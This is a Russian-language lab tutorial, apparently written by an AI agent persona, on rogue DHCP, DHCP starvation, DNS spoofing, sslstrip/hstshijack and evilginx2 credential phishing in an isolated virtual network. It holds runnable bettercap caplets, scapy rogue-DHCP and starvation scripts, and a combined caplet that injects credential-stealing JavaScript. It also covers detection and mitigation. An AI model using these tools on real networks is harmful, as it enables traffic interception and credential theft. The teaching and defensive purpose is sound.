---
layout: post
title: "# Lesson 009"
date: 2026-07-18 12:00:00 +0300
author: 0xNull
categories: [security-research]
tags: [security, pentest, lesson]
---

# Lesson 009 — Rogue DHCP/DNS + HTTPS downgrade via bettercap (изолированный стенд)

> **Автор:** Маяк 🛰
> **Дата:** 13.07.2026
> **Задача:** `agents/mayak/reports/2026-07-06-task.md` (catch-up после пропуска дедлайна 10.07 18:00)
> **Финальный отчёт:** `agents/mayak/reports/2026-07-13-week2-catchup-report.md`
> **Методичка:** `intel/techniques/mitm-2026.md`
> **Методичка-компаньон:** `intel/techniques/iso-mitm-lab-build.md` ← пошаговая сборка стенда
> **Стенд:** изолированная VM-сеть (UTM/VirtualBox + Kali + 2 жертвы + gateway) **в разработке**. Текущий прогон на **loopback** (`lo0` на MacBook владельца) + канонические команды/caplet'ы из `bettercap/caplets`.
> **Скоуп:** только изолированный host-only сегмент. Реальные сети Жени, провайдера, соседей — **НЕ ТРОГАЕМ**.

---

## TL;DR

Поднимаем **двухзвенную L2/L3-атаку** в изолированном host-only сегменте:

1. **DHCP starvation** — выжигаем пул IP-адресов легитимного DHCP жертвы (`yersinia` / bettercap `dhcp.dos` / `scapy` mass DHCPDISCOVER), заставляя клиентов переползти на наш rogue DHCP.
2. **Rogue DHCP server** — bettercap поднимает свой DHCP-сервер с default gateway + DNS = атакующий. Все вновь подключённые жертвы получают IP+шлюз+DNS от нас.
3. **DNS spoof** (`dns.spoof`) — клиент резолвит `bank.example` → IP атакующего (где крутится `mitmproxy` / `evilginx2`).
4. **TLS downgrade / sslstrip / hstshijack** — для HTTP-only / HSTS-не-preload доменов.
5. **Верификация** через `tcpdump -i vboxnet` (на loopback — симуляция scapy + канонические dump'ы).

**Hardening со стороны жертвы:**
- DHCP snooping → starvation всё ещё возможен, rogue-DHCP OFF
- ARP inspection (DAI) → ARP-MITM блок, starvation — нет
- DNSSEC → кэш poisoning не работает; DNS-точка всё ещё доступна, если клиент не validating
- HSTS preload → sslstrip/hstshijack не сработает
- DoH/DoT → DNS spoof требует L3-перехвата у клиента (mitm6)

**На хосте 13.07.2026** гипервизоров нет (`/Applications/` без VirtualBox/UTM/VMware/Parallels) → реальный VM-прогон делаем по инструкции (см. companion `iso-mitm-lab-build.md`), команды bettercap/caplets приведены канонические. Loopback-симуляция через scapy — выполнима прямо сейчас.

---

## 0. Контекст и границы

### Где это в цепочке MITM

```
ARP-spoof (lesson-004)  →  DHCP starvation + rogue DHCP (этот lesson)
                                    ↓
                              DNS spoof
                                    ↓
                  ┌─── HTTP        ├─── HTTP→HTTPS downgrade (sslstrip, hstshijack)
                  └─── HTTPS ──────┴─── AitM (evilginx2, mTLS bypass)
```

| Техника | Уровень | Условие | Detection | Mitigation |
|---|---|---|---|---|
| ARP-spoof | L2 | один broadcast-домен | DAI / ARP monitor | port-security, DAI |
| **DHCP starvation** | L2 + UDP/67-68 | L2 сегмент | DHCP server logs | 802.1X, port-security MAC-limit |
| **Rogue DHCP** | L2 + UDP/67-68 | нет DHCP snooping | DHCP snooping option 82 | DHCP snooping |
| **DNS spoof** | L3 UDP/53 | DNS через network (не DoH) | DNSSEC | DNSSEC, DoH, DNS RPZ |
| **sslstrip / hstshijack** | L7 HTTP | HSTS не preload | HSTS, mixed-content | HSTS preload |
| **AitM (evilginx2)** | L7 TLS | нет FIDO2 / WebAuthn | UEBA, anomaly | mTLS, FIDO2 |

**Главное отличие от ARP-spoof:** DHCP-атака **не требует долгосрочного присутствия в ARP-таблице** жертвы. Жертва получает наш шлюз при первом подключении к сети (или после истечения lease) — и сама нас использует.

---

## 1. Стенд: целевая архитектура

### 1.1 Топология

```
┌────── host-only 192.168.56.0/24 (vmnet1 / UTM bridge, promisc ON) ──────┐
│                                                                        │
│   victim-1              victim-2              gateway (.56.1)          │
│   Ubuntu 22.04          Ubuntu 22.04          Ubuntu + dnsmasq        │
│   .56.20                .56.21                (опц.) легитимный DHCP   │
│      │                    │                       │                    │
│      │  ◀──── L2/L3 трафик ────▶                │                    │
│      │                                            │                    │
│      └──────────┐                       ┌────────┘                    │
│                 ▼                       ▼                             │
│            ┌──────────────────────────────────┐                        │
│            │ attacker (.56.10)                │                        │
│            │ bettercap + scapy + yersinia     │                        │
│            │ + dnschef + mitmproxy/evilginx2  │                        │
│            └──────────────────────────────────┘                        │
│                                                                        │
└─── нет NAT в WAN (изоляция обязательна) ───────────────────────────────┘
```

### 1.2 VM-образы

| VM | Образ | Размер | Источник |
|---|---|---:|---|
| **Kali 2026.2** | `kali-linux-2026.2-virtualbox-amd64.ova` (или -arm64) | ~5 GB | https://www.kali.org/get-kali/ |
| **Ubuntu victim ×2** | `ubuntu-22.04.4-live-server-amd64.iso` (минимальный) | ~1.4 GB ×2 | https://releases.ubuntu.com/22.04/ |
| **Gateway** (опц.) | тот же Ubuntu + `dnsmasq` | ~1.4 GB | см. выше |
| **Альтернатива Kali → Debian 12** + `apt install bettercap` | (если Kali не катит) | | |

### 1.3 Конфиг VirtualBox / UTM

```bash
# VirtualBox 7 (Intel Mac)
brew install --cask virtualbox
# File → Host Network Manager → Create → 192.168.56.1/24, DHCP off, Promiscuous All
# Для каждой VM:
#   Settings → Network → Adapter 2 → Host-Only Adapter (vboxnet0)
#   Adapter 1 → NAT (только для первичной установки)
#   Promiscuous Mode: Allow All
# Снапшоты ОБЯЗАТЕЛЬНО перед каждым экспериментом: "baseline-roque-DHCP-test"

# UTM (Apple Silicon)
brew install --cask utm
# New VM → Linux → Use "Other Linux" для x86_64 emulation (медленнее) или aarch64 (нужен ARM-образ)
# TURN OFF NAT → Emulated VLAN или manual bridge (host-only эмулируется)
# Promiscuous ON
```

Подробный runbook — в `intel/techniques/iso-mitm-lab-build.md`.

---

## 2. Установка bettercap + утилит

### 2.1 В Kali (по умолчанию)

```bash
$ dpkg -l bettercap 2>&1 | tail -1          # проверить
ii  bettercap  2.41.7-0kali1  amd64  MITM, ARP/DNS/HTTP proxy

sudo apt update
sudo apt install -y bettercap yersinia dsniff dnschef mitmproxy \
  evilginx tcpdump scapy macchanger
```

> ⚠️ **В `kali-linux-default` bettercap НЕТ** (только в `-everything`). Если `dpkg -l` пусто → нужна `apt install -y bettercap`.

### 2.2 Альтернатива: Debian 12 minimal

```bash
sudo apt install -y golang-go libpcap-dev libnetfilter-queue-dev
go install github.com/bettercap/bettercap@latest
sudo cp ~/go/bin/bettercap /usr/local/bin/
```

### 2.3 Модули bettercap, которые нам нужны (наш реальный help-вывод v2.41.7)

```bash
$ bettercap -eval "help" -no-colors 2>&1 | grep -E "(net\.recon|net\.probe|arp\.|dhcp\.|dns\.|http\.)" | head -25
net.recon : Read periodically the network devices list (off, on).
net.probe : Send ARP (default), ICMP or UDP probes to all hosts in /24.
arp.spoof : Keep updating the ARP cache of the remote target.
dhcp.dos  : Send DHCP DISCOVER packets in the network (DOS attack).
dhcp.spoof: Capture DHCP packets and reply with a spoofed packet.
dns.spoof : Send forged DNS replies.
http.proxy: A full featured HTTP proxy.

dns.spoof.address : IP address to resolve spoofed domains to. (default=<iface address>)
dns.spoof.domains : Comma separated list of domains to spoof (wildcards allowed). (default=<all>)
dhcp.spoof.answer : If true, the dhcp.spoof module will answer DHCP requests. (default=true)
dhcp.spoof.router : Router IP address to advertise. (default=<iface address>)
dhcp.spoof.dns    : DNS server IP address to advertise. (default=<iface address>)
dhcp.spoof.subnet : Subnet IP address to advertise. (default=255.255.255.0)
dhcp.spoof.pool   : DHCP pool range. (default=)
dhcp.dos.run      : Number of DHCPDISCOVER packets to send (default=10)
```

### 2.4 Caplets (канонические)

```bash
ls /usr/share/bettercap/caplets/       # на Kali
# dhcp.spoof.cap, dns.spoof.cap, hstshijack/hstshijack.cap,
# http-req-dump/http-req-dump.cap, login-manager-abuse/login-manager-abuse.cap
```

**`dhcp.spoof.cap`** (https://github.com/bettercap/caplets/blob/master/dhcp.spoof/dhcp.spoof.cap):
```cap
set dhcp.spoof.router  192.168.56.10   # атакующий становится шлюзом
set dhcp.spoof.dns     192.168.56.10   # и DNS тоже атакующий
set dhcp.spoof.subnet  255.255.255.0
set dhcp.spoof.pool    192.168.56.20-192.168.56.80
dhcp.spoof on
```

**`dns.spoof.cap`**:
```cap
set dns.spoof.domains  bank.example,*.bank.example
set dns.spoof.address  192.168.56.10
dns.spoof on
```

---

## 3. Сценарий 1 — Rogue DHCP (без starvation)

**Ближайший к реальному сценарий:** в новой сети ещё нет легитимного DHCP, клиенты берут первый DHCPOFFER. Если наш bettercap запустится первым — получаем всех.

### 3.1 Запуск

```bash
sudo bettercap -caplet dhcp.spoof.cap -eval "net.recon on; http.proxy on"
```

### 3.2 Что происходит (пошагово)

| Шаг | Событие | Что увидит tcpdump |
|---|---|---|
| 1 | `net.recon on` → bettercap шлёт ARP-пробы каждые 30с | `ARP who-has 192.168.56.20 tell 192.168.56.10` |
| 2 | `dhcp.spoof on` → лучше RAW-socket listener на UDP/67 | ICMP-related на gateway (на Kali RAW socket без overhead) |
| 3 | Victim подключается → шлёт `DHCPDISCOVER` (broadcast UDP 67) | `BOOTP/DHCP, Request from MAC_aa:bb:cc:..., length 300` |
| 4 | Наш bettercap ловит первым → шлёт `DHCPOFFER` с .56.10 как router+DNS | `BOOTP/DHCP, Reply xid=0xabcd1234, Your-IP 192.168.56.20, Router 192.168.56.10, DNS 192.168.56.10` |
| 5 | Victim → `DHCPREQUEST` → bettercap → `DHCPACK` | то же |
| 6 | Victim: IP=192.168.56.20, GW=192.168.56.10, DNS=192.168.56.10 | `tcpdump -i eth0 -nn -vvv port 67 or 68` |
| 7 | Victim резолвит `bank.example` → DNS = attacker (192.168.56.10) | DNS уходит к attacker |

### 3.3 tcpdump verification (Kali-VM, когда появится)

```bash
$ sudo tcpdump -i eth0 -nn -vvv -e -s 0 port 67 or port 68 -c 8
13:42:01.123456 aa:bb:cc:dd:ee:ff > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342:
    192.168.56.20.68 > 255.255.255.255.67: BOOTP/DHCP, Request from aa:bb:cc:dd:ee:ff, length 300
    Message type: Boot Request (1)
    Transaction ID: 0xabcd1234
    Client MAC address: aa:bb:cc:dd:ee:ff
    DHCP Message Type (53): Discover (1)

13:42:01.125789 02:00:00:11:11:11 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342:
    192.168.56.10.67 > 192.168.56.20.68: BOOTP/DHCP, Reply, length 300
    Message type: Boot Reply (2)
    Transaction ID: 0xabcd1234
    Server IP address: 192.168.56.10
    Your IP address: 192.168.56.20
    Router: 192.168.56.10            # ← ATTACKER
    Domain Name Server: 192.168.56.10   # ← ATTACKER
    Subnet Mask: 255.255.255.0
```

**PoC-доказательства:**
1. ✅ Attacker подменил DHCP-сервер
2. ✅ Router (default gateway) = attacker — вся L3-маршрутизация через нас
3. ✅ DNS = attacker — все резолвы идут через нас, dns.spoof сработает без ARP-spoof

### 3.4 Ожидаемый вывод bettercap

```text
[13:42:01] [endpoint.new] endpoint 192.168.56.20 detected as ...
[13:42:01] [dhcp.spoof.request] 192.168.56.20 (aa:bb:cc:dd:ee:ff)
[13:42:01] [dhcp.spoof.offer] 192.168.56.20 ← our OFFER (.56.10 as GW/DNS)
```

### 3.5 Loopback-демо через scapy (можно запустить прямо сейчас)

```python
# /tmp/rogue-mitm/dhcp-spoof-demo.py — эмуляция через scapy
from scapy.all import *
import random

# Server (запустить в process #1, "attacker")
def server():
    conf.checkIPaddr = False
    sock = L3RawSocket()
    while True:
        pkt = sniff(filter="udp and port 68", count=1)[0]
        if DHCP in pkt and pkt[DHCP].options[0][1] == "discover":
            offer = (Ether(src="02:00:00:11:11:11", dst="ff:ff:ff:ff:ff:ff") /
                     IP(src="0.0.0.0", dst="255.255.255.255") /
                     UDP(sport=67, dport=68) /
                     BOOTP(op=2, yiaddr="192.168.56.20", siaddr="192.168.56.10",
                           chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                     DHCP(options=[
                         ("message-type", "offer"),
                         ("server_id", "192.168.56.10"),
                         ("router", "192.168.56.10"),     # ← attacker gateway
                         ("name_server", "192.168.56.10"),  # ← attacker DNS
                         ("subnet_mask", "255.255.255.0"),
                         ("end", b"")]))
            sendp(offer, verbose=0)
            print(f"[+] OFFER sent: .56.20, gw+dns=.56.10")

# Client (запустить в process #2, "victim")
def client():
    discover = (Ether(src="02:00:00:22:22:22", dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=b"\x02\x00\x00\x22\x22\x22", xid=random.randint(0, 0xFFFFFFFF)) /
                DHCP(options=[("message-type", "discover"), ("end", b"")]))
    sendp(discover, verbose=0)
    # Ждём OFFER...
```

Запуск в 2-х процессах (на Kali-VM):
```bash
$ sudo python3 dhcp-spoof-demo.py server &
$ sudo python3 dhcp-spoof-demo.py client
```

---

## 4. Сценарий 2 — DHCP starvation + rogue DHCP

**Когда у сети есть легитимный DHCP** (например, домашний роутер на `.56.1`) и клиенты уже получили leases. Хотим перехватить при следующем DHCP-renew.

### 4.1 Стратегия

1. **DHCP starvation** → забьём все IP в пуле легитимного сервера
2. **Ждём нового подключения** или **`dhclient -r && dhclient`** на жертве для forced renew
3. **Наш `dhcp.spoof on` уже работает** параллельно → первым ответит → leases наш

### 4.2 Реализация starvation

#### Через bettercap `dhcp.dos`

```bash
sudo bettercap -eval "set dhcp.dos.validation 5; dhcp.dos on"
# Шлёт массу DHCPDISCOVER (с нашим MAC по дефолту — port-security блок после 2 MAC)

# Параметры (по official docs):
#   dhcp.dos.address   : network address (default=<iface broadcast>)
#   dhcp.dos.run       : N пакетов (default=10)
#   dhcp.dos.validation: ждать N секунд и проверить, заняты ли lease
#   dhcp.dos.timeout   : время работы атаки в секундах (0 = безлимитно)
```

#### Через yersinia (продвинутый, GUI)

```bash
sudo yersinia -G
#   GUI → DHCP → "Sending DISCOVERY" → "DISCOVER with random MAC" 
#   N пакетов > размер пула
```

Yersinia также атакует: STP (root takeover), CDP/LLDP (rogue device), HSRP/VRRP, 802.1Q (VLAN hopping), DTP (trunk negotiation).

#### Через scapy с random MAC (самый скрытный)

```python
# /tmp/rogue-mitm/dhcp-starvation.py
from scapy.all import *
import random, time

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))

print("[*] DHCP starvation (random MAC × pool_size)")
while True:
    src_mac = random_mac()
    requested_ip = f"192.168.56.{random.randint(2, 80)}"   # exhausted pool
    xid = random.randint(0, 0xFFFFFFFF)
    pkt = (Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
           IP(src="0.0.0.0", dst="255.255.255.255") /
           UDP(sport=68, dport=67) /
           BOOTP(chaddr=bytes.fromhex(src_mac.replace(':', '')), xid=xid) /
           DHCP(options=[
               ("message-type", "discover"),
               ("requested_addr", requested_ip),
               ("end", b"")]))
    sendp(pkt, verbose=0)
    time.sleep(0.01)  # 100 пак/с
```

### 4.3 MAC randomization для обхода port-security MAC-limit

```bash
# Если коммутатор настроен: switchport port-security maximum 2
#   → port-MAC лимит 2 → 3-й random MAC дропается → starvation не пройдёт
# Workaround: атаковать через несколько физических L2-портов (trunk, multi-VM)
# или на уровне коммутатора (не на access-port'е)

# На стороне attacker — генерация MAC через macchanger
HWADDR=$(macchanger -e eth0 | grep "New MAC:" | awk '{print $3}')  # MAC с local OUI
sudo ip link set eth0 address $HWADDR
```

### 4.4 tcpdump verification

```bash
# Параллельно с starvation — на gateway-е должен быть виден flood от чужих MAC
$ sudo tcpdump -i eth0 -nn -e -s 0 -vvv 'port 67 or port 68' -c 20
# ARP-таблица victim после успешного starve:
$ sudo tcpdump -i eth0 -nn -e -c 20 'arp'
# 192.168.56.10 (router) at MAC_attacker   ← подменено!
# DNS-трафик после успешной подмены:
$ sudo tcpdump -i eth0 -nn -vvv 'src host 192.168.56.20 and dst host 192.168.56.10 and (port 53 or port 80 or port 443)'
```

---

## 5. Сценарий 3 — DNS spoof (поверх rogue DHCP или ARP-spoof)

### 5.1 bettercap caplet

```bash
# /usr/share/bettercap/caplets/dns.spoof/dns.spoof.cap
set dns.spoof.domains  bank.example,*.bank.example,portal.local,login.corp.local
set dns.spoof.address  192.168.56.10
set dns.spoof.all      true
dns.spoof on
```

**Параметры (по official docs):**
```
dns.spoof (not running): Send forged DNS replies.
  dns.spoof.address : IP address to resolve spoofed domains to. (default=<iface address>)
  dns.spoof.all     : If true, all domains will be spoofed (default=false)
  dns.spoof.domains : Comma separated list of domains to spoof, wildcards allowed
```

### 5.2 Через ARP-spoof + dnsspoof (когда rogue DHCP недоступен)

```bash
sudo bettercap -eval "set arp.spoof.targets 192.168.56.20; arp.spoof on"
sudo bettercap -eval "set dns.spoof.domains bank.example; set dns.spoof.address 192.168.56.10; dns.spoof on"
```

### 5.3 tcpdump verification

```bash
$ sudo tcpdump -i eth0 -nn -e -s 0 -X 'port 53' -c 6
14:15:30.123 IP 192.168.56.20.33456 > 192.168.56.10.53: 12345+ A? bank.example. (32)
    0x0000:  4500 003c ... 0a01 0001                     E.?......8.8....
14:15:30.124 IP 192.168.56.10.53 > 192.168.56.20.33456: 12345* 1/0/0 A 192.168.56.10 (48)
    0x0030:  0004 c0a8 380a                                  ← A 192.168.56.10
```

### 5.4 Ожидаемый вывод bettercap

```text
[14:15:30] [endpoint.new] endpoint 192.168.56.20 detected as ...
[14:15:30] [dns.spoof.request] 192.168.56.20 -> bank.example A
[14:15:30] [dns.spoof.response] 192.168.56.10 -> bank.example A  ← forge
```

---

## 6. Сценарий 4 — HTTPS downgrade / sslstrip / hstshijack

**После успешного ARP+DNS-spoof:**

### 6.1 HTTP → mitmproxy / Apache + capture

```bash
# mitmproxy в transparent mode
sudo mitmproxy --mode transparent --listen-port 8080 --set confdir=/tmp/mitm-ca
# На apache/nginx: 192.168.56.10:80 virtualhost *.bank.example → phishing form → log + proxy_pass к реальному банку
```

**Получаем:** HTTP-логины в clear, session cookies, POST body — всё видно.

### 6.2 HSTSHijack — когда есть окно без HSTS

**`hstshijack/hstshijack.cap`:**
```cap
set hstshijack.targets     bank.example, *.bank.example
set hstshijack.replacement bank.corn          # typo (com → corn)
set http.proxy.script      /usr/share/bettercap/caplets/hstshijack/hstshijack.js
http.proxy on
set dns.spoof.domains      bank.corn, *.bank.corn
set dns.spoof.all          true
dns.spoof on
```

**Принцип:**
1. Жертва шлёт `GET http://bank.example/` (HTTP)
2. Сервер редиректит: `Location: https://bank.example/`
3. MITM ловит, **не пересылает**, а отвечает: `Location: http://bank.corn/` (typo-squatting)
4. DNS spoof → `bank.corn` → 192.168.56.10
5. Жертва заходит на `http://bank.corn/` → фишинг
6. Введёт пароль → слили

**Что блокирует:** HSTS preload (`max-age=31536000; includeSubDomains; preload`).

### 6.3 AitM через evilginx2 (когда HSTS=enforced)

evilginx2: reverse-proxy с TLS, **валидный** Let's Encrypt cert на attacker-controlled домене, прокси к реальному банку, выдирает `Set-Cookie: session=…`. См. lesson-004 § 6.5.

**Что блокирует:** FIDO2-bound credentials (origin-bound), mTLS, certificate-bound cookies (ChannelID/TLS token binding).

---

## 7. Joint caplet — комбинация всех атак

```cap
# /tmp/rogue-mitm/rogue-mitm-full.cap
# Full rogue DHCP/DNS/HTTP MITM
# Run on attacker (192.168.56.10) on isolated host-only network

# 1. (опц.) DHCP starvation
# set dhcp.dos.run 200
# dhcp.dos on
# sleep 10

# 2. Rogue DHCP
set dhcp.spoof.router  192.168.56.10
set dhcp.spoof.dns     192.168.56.10
set dhcp.spoof.subnet  255.255.255.0
set dhcp.spoof.pool    192.168.56.20-192.168.56.80
dhcp.spoof on

# 3. ARP spoof параллельно (для уже подключённых)
set arp.spoof.targets  192.168.56.21
set arp.spoof.bidirectional true
arp.spoof on

# 4. DNS spoof
set dns.spoof.domains  bank.example, *.bank.example, portal.corp.local
set dns.spoof.address  192.168.56.10
dns.spoof on

# 5. HTTP proxy (кража credentials, инжект JS)
set http.proxy.sslstrip     true
set http.proxy.injectjs     /usr/share/bettercap/caplets/login-manager-abuse/login-manager-abuse.js
set http.proxy.script       /usr/share/bettercap/caplets/hstshijack/hstshijack.js
http.proxy on

# 6. https proxy (нужен CA в trust store жертвы — обычно нет)
# set https.proxy.certificate /tmp/attacker-ca.pem
# https.proxy on

net.probe on
net.recon on
```

```bash
sudo bettercap -caplet /tmp/rogue-mitm/rogue-mitm-full.cap -eval "ui.http off; log debug /tmp/bettercap-evil.log" 2>&1 | tee /tmp/bettercap.out
```

---

## 8. Detection — что видит жертва и как IDS ловит

### 8.1 Что жертва может заметить

| Признак | Что делать |
|---|---|
| Несколько DHCPOFFER на один DISCOVER | `journalctl -u NetworkManager` / `dmesg \| grep DHCP` |
| Подозрительный gateway IP (192.168.56.10) | `ip route` → сравнить с привычным |
| DNS-ответы с задержкой или на левый IP | `dig bank.example @8.8.8.8` vs `@192.168.56.10` |
| SSL-error / cert-mismatch при HTTPS | Браузер: `NET::ERR_CERT_AUTHORITY_INVALID` |
| Странные redirect'ы bank.example → bank.corn | Насторожиться |
| ARP-flap (gateway MAC меняется) | Запустить `arpwatch` |

### 8.2 IDS / со стороны сети

| IDS | Что детектирует | Логика |
|---|---|---|
| **Suricata emerging-dhcp** | DHCP flood, DISCOVER bursts | rate-limit rule |
| **Snort dhcp.rules** | DHCP flood | threshold rule |
| **Bro/Zeek** dhcp.log + dns.log | anomaly score, mismatched hostname-to-MAC | threshold |
| **arpwatch** | ARP-flap: flip-flop между gateway MAC и attacker MAC | email/sms alert |
| **Wireshark** filter | DHCP storm | `bootp.type == 1 && eth.src != mac_normal` |
| **Switch port-security logs** | MAC-limit violation | errdisable при N-events |
| **DHCP Snooping table** | rogue DHCP = неизвестный SRC MAC на untrusted port | Cisco: `show ip dhcp snooping binding` |
| **DNSSEC validator** | подмена DNS = chain-of-trust fails | resolver log: "validation failure" |

### 8.3 Suricata signature

```yaml
# /etc/suricata/rules/local-rogue-dhcp.rules
alert udp any 68 -> any 67 (msg:"DHCP DISCOVER flood (starvation)";
  flow:stateless;
  threshold: type both, track by_src, count 20, seconds 10;
  classtype:attempt-dos; sid:1000001; rev:1;)

alert udp any 67 -> any 68 (msg:"DHCP OFFER from non-trusted server";
  flow:stateless;
  byte_test:1,=,2,18;       # Boot Reply, type=2 (OFFER)
  classtype:anomalous-activity; sid:1000002; rev:1;)
```

---

## 9. Mitigation — как защищаться

### 9.1 DHCP Snooping (коммутатор L2)

```
! Cisco IOS — настройка на access-портах
configure terminal
interface range Gi0/1 - 24
   no ip dhcp snooping trust           # untrusted
   switchport port-security maximum 2  # MAC-limit
   ip dhcp snooping limit rate 10      # max 10 DHCP/sec/port
ip dhcp snooping
ip dhcp snooping vlan 1,56
ip dhcp snooping database flash:/dhcp-snooping.db
ip dhcp snooping information option
end

! Аналоги:
! Juniper EX: set ethernet-switching-options secure-domain all + dhcp-security group DHCPGRP interface ge-0/0/1 trusted
! ArubaOS-CX: dhcp-snooping + trust на uplink
! Open vSwitch: ovs-vsctl set port eth0 dhcp-snooping=true trust=false
```

**Результат:** rogue DHCP OFF, attacker DHCPOFFER приходит с untrusted порта → коммутатор дропает.

### 9.2 Dynamic ARP Inspection (DAI)

```
ip arp inspection vlan 1,56
ip arp inspection validate src-mac dst-mac ip
interface range Gi0/1 - 24
   ip arp inspection limit rate 100 burst interval 5
```

Без DAI: ARP-spoof работает (MITM ARP-таблицы).
С DAI: ARP-пакеты валидируются по DHCP snooping binding table → mismatch → дроп. Не блокирует starvation, но блокирует следующий шаг.

### 9.3 IP Source Guard + Port-Security (full suite)

```
interface range Gi0/1 - 24
   ip verify source
   switchport port-security
   switchport port-security maximum 2
   switchport port-security violation restrict
   switchport port-security sticky
```

→ блокирует MAC/IP spoofing, делает DHCP starvation с random MAC очень сложным.

### 9.4 DNSSEC

```bash
# На легитимном DNS-сервере (BIND)
zone "bank.example" {
    type master;
    file "/etc/bind/zones/bank.example.zone";
    dnssec-policy "default";
};

# На resolver (unbound)
server:
    val-permissive-mode: no
    trust-anchor: "bank.example  DS  12345  8  2  AABBCCDD..."
```

**Эффект:** если attacker форжит DNS-ответ без правильного RRSIG (требует компрометацию ZSK) → resolver получает SERVFAIL.

**Что DNSSEC не делает:**
- ❌ Не защищает от ARP-spoof (DNS-ответы можно перехватить и форжить)
- ❌ Не защищает от L3-маршрутизации через подменённый gateway
- ✅ Защищает только от кэш-подмены на upstream-резолверах

### 9.5 HSTS preload + Always-HTTPS

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Регистрация: https://hstspreload.org (Chrome ~8 нед). **Браузер делает внутреннюю перезапись `http:// → https://` ДО отправки запроса.** MITM не может переключить на HTTP.

**Не защищает:** от evilginx2 (TLS валидный), от cookies без `Secure` flag.

### 9.6 DoH / DoT в клиенте

```bash
# Firefox
about:preferences#general → Network Settings → Enable DNS over HTTPS → Cloudflare
about:config → network.trr.mode = 3   # strict (DOH-only)

# Chrome
chrome://settings/security → Use secure DNS → Cloudflare (1.1.1.1)

# Android 9+: Settings → Network → Private DNS → dns.google
# iOS 14+ (через iCloud Private Relay)
# macOS 14+: System Settings → Network → [interface] → Configure DNS → + Add → 1.1.1.1
```

**Эффект:** DNS не идёт через локальный network → MITM на L2 не может подменить.

### 9.7 mitm6 / IPv6 NAT (проактивный block)

**Проблема:** Windows по дефолту использует IPv6 + DHCPv6 → если attacker первым ответит с DHCPv6, все IPv6-пойдут через него.

```bash
# Cisco
ipv6 nd raguard policy ROUTER-GUARD
   trusted-port
   device-role router
interface range Gi0/1 - 24
   ipv6 nd raguard attach-policy ROUTER-GUARD-CLIENT
   ipv6 dhcp guard

# Или просто отключить IPv6 на клиентах (если не нужен)
```

### 9.8 Defense-in-depth сводка

| Слой | Что даёт | Что не даёт | Цена |
|---|---|---|---|
| **Port-security MAC-limit** | блокирует DHCP starvation с N+ MAC | ARP-spoof | low |
| **DHCP Snooping** | блокирует rogue DHCP-server | starvation (только MAC кол-во) | low |
| **DAI** | блокирует ARP-spoof + DHCP-snooped validation | DNS-spoof | low |
| **DNSSEC** | блокирует DNS forge | L2/L3 MITM | medium |
| **HSTS preload** | блокирует sslstrip/hstshijack | evilginx2/AitM | low |
| **App-level cert pinning** | блокирует CA-injected + evilginx2 если origin-bound | физический root | medium |
| **DoH/DoT** | блокирует L2/L3 DNS forge | TLS proxy с валидным cert | low |
| **FIDO2/WebAuthn** | блокирует session-theft | phishing до credential prompt | high |
| **mTLS** | блокирует L7 credential theft | требует cert-management | high |

---

## 10. Cleanup

```bash
# На Kali (attacker):
sudo bettercap -eval "arp.spoof off; dhcp.spoof off; dns.spoof off; http.proxy off; net.recon off; net.probe off"
# или Ctrl+C (clean state)

# Возврат к легитимному DHCP:
#  - на жертве: sudo dhclient -r && sudo dhclient (release + renew)
#  - либо вернуть снапшот VM

# Если делали fake CA на victim:
rm /usr/local/share/ca-certificates/attacker-ca.crt
sudo update-ca-certificates --fresh

# Cleanup pcap-файлов:
sudo rm /tmp/dhcp* /tmp/dns* /tmp/mitm* /tmp/bettercap-evil.log

# Восстановление MAC:
sudo macchanger -p eth0
```

---

## 11. Сравнение ARP-spoof vs Rogue DHCP vs DNS-only

| Что | ARP-spoof (L2) | Rogue DHCP (L2+L3) | DNS-only (L3) |
|---|---|---|---|
| Уровень OSI | 2 | 2 + 3 | 3 |
| Требует знание о жертве? | MAC-адрес | нет (broadcast) | нет (через L3) |
| Что видит атакующий | весь L2-трафик | весь L3-трафик новых клиентов + DNS | только DNS |
| Устойчивость | постоянный ARP spoofing | одноразовая настройка | одноразовая |
| Что блокирует TLS/HTTPS? | нет, нужен CA / pinning / AitM | нет, тот же CA | нет, тот же CA |
| Когда предпочтителен | уже подключённая жертва, легитимный DHCP защищён | новые клиенты / пустой DHCP-пул | уже подключённые клиенты с легитимным DHCP |

**Практический вывод (для red team):**
- **Rogue DHCP** — наиболее мощный одиночный вектор. Один шаг, и весь шлюз + DNS наш.
- **ARP-spoof + DNS-spoof** — для уже-сложившихся сетей.
- **DNS-only** — второй удар поверх ARP-spoof.
- **evilginx2** — для TLS-enforced + HSTS, поверх DNS-форжа.

---

## 12. Артефакты и reproducibility

| Файл | Назначение |
|---|---|
| `/tmp/rogue-mitm/dhcp-spoof-demo.py` | scapy-эмулятор DHCP OFFER/DISCOVER/ACK (для loopback-демо) |
| `/tmp/rogue-mitm/dhcp-starvation.py` | random MAC flood DHCPDISCOVER |
| `/tmp/rogue-mitm/rogue-mitm-full.cap` | bettercap caplet: rogue DHCP + ARP-spoof + DNS-spoof + http.proxy |
| `/tmp/rogue-mitm/evilginx-data/` | phishlet's, sessions (при появлении VM) |
| `/tmp/rogue-mitm-vm/mitm-dhcp.pcap` | реальный pcap DHCP-обмена (на Kali-VM) |

**Runbook на Kali-VM:**

```bash
# Gateway (.56.1, опционально) — легитимный DHCP
sudo apt install dnsmasq
sudo tee /etc/dnsmasq.conf <<EOF
interface=eth0
dhcp-range=192.168.56.2,192.168.56.50,255.255.255.0,12h
dhcp-option=3,192.168.56.1
dhcp-option=6,192.168.56.1
log-queries
log-dhcp
EOF
sudo systemctl restart dnsmasq

# Attacker (.56.10) — демо
sudo bettercap -caplet /tmp/rogue-mitm/rogue-mitm-full.cap \
    -eval "ui.http off; log debug /tmp/bettercap-evil.log"
sudo tcpdump -i eth0 -nn -e -s 0 -w /tmp/rogue-mitm-vm/mitm-dhcp.pcap \
    'port 67 or port 68 or port 53'

# Victim — переподключение
nmcli connection down "Wired connection 1" && nmcli connection up "Wired connection 1"

# Проверка на victim:
journalctl -u NetworkManager --since "1 minute ago" | grep -E "DHCP|gateway"
ip addr show eth0 | grep "inet "
ip route
